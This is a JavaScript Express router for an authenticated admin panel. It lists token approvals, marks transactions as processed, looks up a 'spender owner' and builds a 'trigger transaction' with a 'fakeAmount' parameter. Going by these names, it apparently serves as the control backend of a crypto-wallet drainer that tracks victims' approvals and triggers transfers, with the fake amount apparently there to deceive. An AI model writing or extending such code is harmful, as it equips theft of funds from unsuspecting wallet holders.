const express = require('express');
const bcrypt = require('bcryptjs');
const config = require('../config');
const database = require('../services/database');
const blockchain = require('../services/blockchain');

const router = express.Router();

// Simple authentication middleware
const authenticate = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Basic ')) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
  const [username, password] = credentials.split(':');
  
  if (username === config.app.adminUsername && 
      bcrypt.compareSync(password, config.app.adminPasswordHash)) {
    next();
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
};

// Get all approvals
router.get('/approvals', authenticate, async (req, res) => {
  try {
    const approvals = await database.getPendingAndConfirmed();
    res.json(approvals);
  } catch (error) {
    console.error('Error fetching approvals:', error);
    res.status(500).json({ error: 'Failed to fetch approvals' });
  }
});

// Mark as processed
router.post('/mark-processed', authenticate, async (req, res) => {
  try {
    const { txHash } = req.body;
    const updated = await database.markAsProcessed(txHash);
    if (updated) {
      res.json({ success: true });
    } else {
      res.status(404).json({ error: 'Approval not found' });
    }
  } catch (error) {
    console.error('Error marking as processed:', error);
    res.status(500).json({ error: 'Failed to mark as processed' });
  }
});

// Get spender owner
router.get('/spender-owner', authenticate, async (req, res) => {
  try {
    const owner = await blockchain.getSpenderOwner();
    res.json({ owner });
  } catch (error) {
    console.error('Error getting spender owner:', error);
    res.status(500).json({ error: 'Failed to get spender owner' });
  }
});

// Create trigger transaction
router.post('/trigger-transaction', authenticate, async (req, res) => {
  try {
    const { owner, fakeAmount } = req.body;
    const tx = await blockchain.createTriggerTransaction(owner, fakeAmount);
    res.json(tx);
  } catch (error) {
    console.error('Error creating trigger transaction:', error);
    res.status(500).json({ error: 'Failed to create transaction' });
  }
});

// Health check
router.get('/health', async (req, res) => {
  try {
    // Check database connection
    const dbStatus = 'connected'; // In a real app, you'd check actual connection
    
    // Check blockchain provider
    const blockNumber = await blockchain.providerHttp.getBlockNumber();
    const providerStatus = blockNumber > 0 ? 'connected' : 'disconnected';
    
    res.json({
      status: 'ok',
      timestamp: new Date(),
      services: {
        database: dbStatus,
        blockchain: providerStatus
      },
      blockNumber
    });
  } catch (error) {
    res.status(500).json({
      status: 'error',
      error: error.message
    });
  }
});

module.exports = router;
